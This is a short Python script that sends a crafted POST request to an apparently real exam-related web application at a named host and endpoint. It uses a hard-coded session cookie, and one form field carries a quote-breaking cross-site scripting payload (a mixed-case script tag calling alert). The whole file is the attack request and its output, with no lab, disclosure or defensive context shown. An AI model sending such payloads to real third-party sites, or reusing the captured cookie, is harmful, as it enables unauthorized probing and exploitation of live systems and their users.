import requests


headers = {
    "Content-Type" : "application/x-www-form-urlencoded",
    "Referer" : "http://dmj006.51baxue.com:19001/edei/",
    "Cookie" : "cookie_100567904425181238=13CCF154669A4D3607D95044844E517C",
    "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Encoding" : "gzip,deflate,br",
    "Content-Length" : "229",
    "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",
    "Host" : "dmj006.51baxue.com:19001",
    "Connection" : "Keep-alive",
}
data = "exam1=1&exampaperNum1=1&exams=1&grade1=1&gradeNum=1&isParent=1&p_questionNum=1&preexamscore=1&searchType=the&subType=0&subject1=1&subjectNum=1&tabye=1'"
data += '"()%26%25<acx><ScRiPt%20>alert(/1/)</ScRiPt>&tabye1=1&tag=17&userType=RDFYjolf'
response = requests.post(headers=headers, url="http://dmj006.51baxue.com:19001/edei/awardPointAction.action", data=data)
print(response.text)